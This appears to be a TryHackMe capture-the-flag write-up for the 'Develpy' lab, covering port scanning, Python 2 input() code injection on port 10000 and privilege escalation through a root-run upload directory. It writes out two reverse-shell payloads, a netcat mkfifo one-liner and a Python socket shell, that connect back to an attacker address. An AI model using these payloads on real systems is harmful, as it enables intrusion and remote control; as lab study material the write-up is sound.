-----------------

### CTF: TRYHACKME
### LAB: Develpy

-----------------

![image](https://github.com/user-attachments/assets/7d795f58-d97e-41e9-ac00-d746b48af727)

-----------------

### Recon

- Rustscan's output



      ❯ rustscan -a 10.10.222.233 -- -sC -sV
      .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
      | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
      | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
      `-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
      The Modern Day Port Scanner.
      ________________________________________
      : https://discord.gg/GFrQsGy           :
      : https://github.com/RustScan/RustScan :
       --------------------------------------
      😵 https://admin.tryhackme.com
      
      [~] The config file is expected to be at "/home/sensei/.rustscan.toml"
      [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
      [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
      Open 10.10.222.233:22
      Open 10.10.222.233:10000
      [~] Starting Script(s)
      [>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
      
      [~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-21 17:08 EDT
      NSE: Loaded 156 scripts for scanning.
      NSE: Script Pre-scanning.
      NSE: Starting runlevel 1 (of 3) scan.
      Initiating NSE at 17:08
      Completed NSE at 17:08, 0.00s elapsed
      NSE: Starting runlevel 2 (of 3) scan.
      Initiating NSE at 17:08
      Completed NSE at 17:08, 0.00s elapsed
      NSE: Starting runlevel 3 (of 3) scan.
      Initiating NSE at 17:08
      Completed NSE at 17:08, 0.00s elapsed
      Initiating Ping Scan at 17:08
      Scanning 10.10.222.233 [2 ports]
      Completed Ping Scan at 17:08, 0.80s elapsed (1 total hosts)
      Initiating Parallel DNS resolution of 1 host. at 17:08
      Completed Parallel DNS resolution of 1 host. at 17:08, 0.39s elapsed
      DNS resolution of 1 IPs took 0.39s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
      Initiating Connect Scan at 17:08
      Scanning 10.10.222.233 [2 ports]
      Discovered open port 22/tcp on 10.10.222.233
      Discovered open port 10000/tcp on 10.10.222.233
      Completed Connect Scan at 17:08, 0.74s elapsed (2 total ports)
      Initiating Service scan at 17:08
      Scanning 2 services on 10.10.222.233
      Completed Service scan at 17:10, 130.26s elapsed (2 services on 1 host)
      NSE: Script scanning 10.10.222.233.
      NSE: Starting runlevel 1 (of 3) scan.
      Initiating NSE at 17:10
      Completed NSE at 17:10, 10.61s elapsed
      NSE: Starting runlevel 2 (of 3) scan.
      Initiating NSE at 17:10
      Completed NSE at 17:10, 6.67s elapsed
      NSE: Starting runlevel 3 (of 3) scan.
      Initiating NSE at 17:10
      Completed NSE at 17:10, 0.00s elapsed
      Nmap scan report for 10.10.222.233
      Host is up, received conn-refused (0.79s latency).
      Scanned at 2024-08-21 17:08:15 EDT for 149s
      
      PORT      STATE SERVICE           REASON  VERSION
      22/tcp    open  ssh               syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
      | ssh-hostkey: 
      |   2048 78:c4:40:84:f4:42:13:8e:79:f8:6b:e4:6d:bf:d4:46 (RSA)
      | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDeAB1tAGCfeGkiBXodMGeCc6prI2xaWz/fNRhwusVEujBTQ1BdY3BqPHNf1JLGhqts1anfY9ydt0N1cdAEv3L16vH2cis+34jyek3d+TVp+oBLztNWY5Yfcv/3uRcy5yyZsKjMz+wyribpEFlbpvscrVYfI2Crtm5CgcaSwqDDtc1doeABJ9t3iSv+7MKBdWJ9N3xd/oTfI0fEOdIp8M568A1/CJEQINFPVu1txC/HTiY4jmVkNf6+JyJfFqshRMpFq2YmUi6GulwzWQONmbTyxqrZg2y+y2q1AuFeritRg9vvkBInW0x18FS8KLdy5ohoXgeoWsznpR1J/BzkNfap
      |   256 25:9d:f3:29:a2:62:4b:24:f2:83:36:cf:a7:75:bb:66 (ECDSA)
      | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDGGFFv4aQm/+j6R2Vsg96zpBowtu0/pkUxksqjTqKhAFtHla6LE0BRJtSYgmm8+ItlKHjJX8DNYylnNDG+Ol/U=
      |   256 e7:a0:07:b0:b9:cb:74:e9:d6:16:7d:7a:67:fe:c1:1d (ED25519)
      |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMbypBoQ33EbivAc05LqKzxLsJrTgXOrXG7qG/RoO30K
      10000/tcp open  snet-sensor-mgmt? syn-ack
      | fingerprint-strings: 
      |   GenericLines: 
      |     Private 0days
      |     Please enther number of exploits to send??: Traceback (most recent call last):
      |     File "./exploit.py", line 6, in <module>
      |     num_exploits = int(input(' Please enther number of exploits to send??: '))
      |     File "<string>", line 0
      |     SyntaxError: unexpected EOF while parsing
      |   GetRequest: 
      |     Private 0days
      |     Please enther number of exploits to send??: Traceback (most recent call last):
      |     File "./exploit.py", line 6, in <module>
      |     num_exploits = int(input(' Please enther number of exploits to send??: '))
      |     File "<string>", line 1, in <module>
      |     NameError: name 'GET' is not defined
      |   HTTPOptions, RTSPRequest: 
      |     Private 0days
      |     Please enther number of exploits to send??: Traceback (most recent call last):
      |     File "./exploit.py", line 6, in <module>
      |     num_exploits = int(input(' Please enther number of exploits to send??: '))
      |     File "<string>", line 1, in <module>
      |     NameError: name 'OPTIONS' is not defined
      |   NULL: 
      |     Private 0days
      |_    Please enther number of exploits to send??:
      1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
      SF-Port10000-TCP:V=7.94SVN%I=7%D=8/21%Time=66C65747%P=x86_64-pc-linux-gnu%
      SF:r(NULL,48,"\r\n\x20\x20\x20\x20\x20\x20\x20\x20Private\x200days\r\n\r\n
      SF:\x20Please\x20enther\x20number\x20of\x20exploits\x20to\x20send\?\?:\x20
      SF:")%r(GetRequest,136,"\r\n\x20\x20\x20\x20\x20\x20\x20\x20Private\x200da
      SF:ys\r\n\r\n\x20Please\x20enther\x20number\x20of\x20exploits\x20to\x20sen
      SF:d\?\?:\x20Traceback\x20\(most\x20recent\x20call\x20last\):\r\n\x20\x20F
      SF:ile\x20\"\./exploit\.py\",\x20line\x206,\x20in\x20<module>\r\n\x20\x20\
      SF:x20\x20num_exploits\x20=\x20int\(input\('\x20Please\x20enther\x20number
      SF:\x20of\x20exploits\x20to\x20send\?\?:\x20'\)\)\r\n\x20\x20File\x20\"<st
      SF:ring>\",\x20line\x201,\x20in\x20<module>\r\nNameError:\x20name\x20'GET'
      SF:\x20is\x20not\x20defined\r\n")%r(HTTPOptions,13A,"\r\n\x20\x20\x20\x20\
      SF:x20\x20\x20\x20Private\x200days\r\n\r\n\x20Please\x20enther\x20number\x
      SF:20of\x20exploits\x20to\x20send\?\?:\x20Traceback\x20\(most\x20recent\x2
      SF:0call\x20last\):\r\n\x20\x20File\x20\"\./exploit\.py\",\x20line\x206,\x
      SF:20in\x20<module>\r\n\x20\x20\x20\x20num_exploits\x20=\x20int\(input\('\
      SF:x20Please\x20enther\x20number\x20of\x20exploits\x20to\x20send\?\?:\x20'
      SF:\)\)\r\n\x20\x20File\x20\"<string>\",\x20line\x201,\x20in\x20<module>\r
      SF:\nNameError:\x20name\x20'OPTIONS'\x20is\x20not\x20defined\r\n")%r(RTSPR
      SF:equest,13A,"\r\n\x20\x20\x20\x20\x20\x20\x20\x20Private\x200days\r\n\r\
      SF:n\x20Please\x20enther\x20number\x20of\x20exploits\x20to\x20send\?\?:\x2
      SF:0Traceback\x20\(most\x20recent\x20call\x20last\):\r\n\x20\x20File\x20\"
      SF:\./exploit\.py\",\x20line\x206,\x20in\x20<module>\r\n\x20\x20\x20\x20nu
      SF:m_exploits\x20=\x20int\(input\('\x20Please\x20enther\x20number\x20of\x2
      SF:0exploits\x20to\x20send\?\?:\x20'\)\)\r\n\x20\x20File\x20\"<string>\",\
      SF:x20line\x201,\x20in\x20<module>\r\nNameError:\x20name\x20'OPTIONS'\x20i
      SF:s\x20not\x20defined\r\n")%r(GenericLines,13B,"\r\n\x20\x20\x20\x20\x20\
      SF:x20\x20\x20Private\x200days\r\n\r\n\x20Please\x20enther\x20number\x20of
      SF:\x20exploits\x20to\x20send\?\?:\x20Traceback\x20\(most\x20recent\x20cal
      SF:l\x20last\):\r\n\x20\x20File\x20\"\./exploit\.py\",\x20line\x206,\x20in
      SF:\x20<module>\r\n\x20\x20\x20\x20num_exploits\x20=\x20int\(input\('\x20P
      SF:lease\x20enther\x20number\x20of\x20exploits\x20to\x20send\?\?:\x20'\)\)
      SF:\r\n\x20\x20File\x20\"<string>\",\x20line\x200\r\n\x20\x20\x20\x20\r\n\
      SF:x20\x20\x20\x20\^\r\nSyntaxError:\x20unexpected\x20EOF\x20while\x20pars
      SF:ing\r\n");
      Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  
- Port `10000` hosts a python script, I discovered that by sending random characters which triggered a python `NameError`.

![image](https://github.com/user-attachments/assets/bcb7983d-16e0-4016-99b5-1f0b8b7c847a)

- We got a bit of the source code which includes `int(input())`, `input()` in python2.7 and python2 evaluates code which can lead to code execution.
We can also escalate this eode execution to command injection through modules like `os` and `subprocess`. Here is an example

![image](https://github.com/user-attachments/assets/7f55e2b2-000d-4bfe-b7e4-8cba8ea82703)

I was able to trigger binary the command to echo `God Abeg!!!.

----------------------

### Reverse shell

- I used this payload to trigger a rev shell

   Payload-:```echo "__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc <ip> <port> >/tmp/f')" |nc 10.10.222.233 10000```

- Shell access as user `king`

  ![image](https://github.com/user-attachments/assets/487a8e7e-fc99-4a71-8626-1af7ddbd51ef)
  
---------------------

### PRIVESC WITH INTERNAL ROOT SERVICE

- A `root.sh` in user `king` home directory reveals that root runs every py file in  a particular directory `/media/`

![image](https://github.com/user-attachments/assets/03d9aa3f-7ad8-4881-af0a-217dea19d210)

- I ran `netstat -antp` and noticed a service on port `8080`.

![image](https://github.com/user-attachments/assets/205f6e74-9d7c-4fd3-bead-3d52ea74cb79)

- I checked it with netcat and noticed that it is a web page with py file upload functionality. This service upload the py files to the `/media/` directory.

            king@ubuntu:~$ nc 127.0.0.1 8080
            GET / HTTP/1.1
            
            HTTP/1.1 200 OK
            Date: Wed, 21 Aug 2024 21:30:30 GMT
            Server: WSGIServer/0.2 CPython/3.5.2
            Content-Length: 2097
            X-Frame-Options: SAMEORIGIN
            Content-Type: text/html; charset=utf-8
            
            <!doctype html>
            <html lang="en">
            <head>
              <meta charset="utf-8">
              <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
              <link rel="stylesheet" type="text/css" href="mysite/static/css/bootstrap.min.css">
              <link rel="stylesheet" type="text/css" href="mysite/static/css/app.css">
              <title>DevelPy - Programming Services</title>
            </head>
            <body>
              <nav class="navbar navbar-expand-lg navbar-light mb-4" style="background-color:#decdc3">
                <div class="container">
                  <a class="navbar-brand" href="/">DevelPy</a>
                  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
                    <span class="navbar-toggler-icon"></span>
                  </button>
                  <div class="collapse navbar-collapse" id="navbarSupportedContent">
                    <ul class="navbar-nav">
                      <li class="nav-item">
                        <a class="nav-link" href="/">Home</a>
                      </li>
                      <li class="nav-item">
                        <a class="nav-link" href="/upload/">Simple Upload</a>
                      </li>        </ul>
                  </div>
                </div>
              </nav>
              <div class="container">
                <div class="row justify-content-center">
                  <div class="col-lg-10 col-md-12">
                    <div class="card mb-4">
                      <div class="card-body">
                        
              <h2 class="card-title">Welcome to DevelPy - Python programming!</h2>
              <p class="card-text">you search job? send your .py file! and show your talent!</p>
            
                      </div>
                    </div>
                  </div>
                </div>
            
- I port forwarded the service to my machine with chisel.

![image](https://github.com/user-attachments/assets/2f5537f5-a283-4285-bfa9-0ceb8f51eea6)

- Now the webpage is running locally on our machine

![image](https://github.com/user-attachments/assets/08de28e9-96d5-4d1e-ab51-a6bbe56f0294)

- Our py script is rev shell python code from [revshells.com](https://revshell.com].
  
  Payload:```import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<ip>,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")```

- File uploaded
  
![image](https://github.com/user-attachments/assets/b526e538-edd1-45f1-be91-2ba691c0c759)

- Root shell

![image](https://github.com/user-attachments/assets/aab6fbc0-f644-41a8-bf51-55ed978959aa)

--------------------

### REFERENCES:

- [Abusing input() in python2](https://sevenlayers.com/index.php/215-abusing-python-input)

--------------------

### THANKS FOR READING!!!!

--------------------


  


            

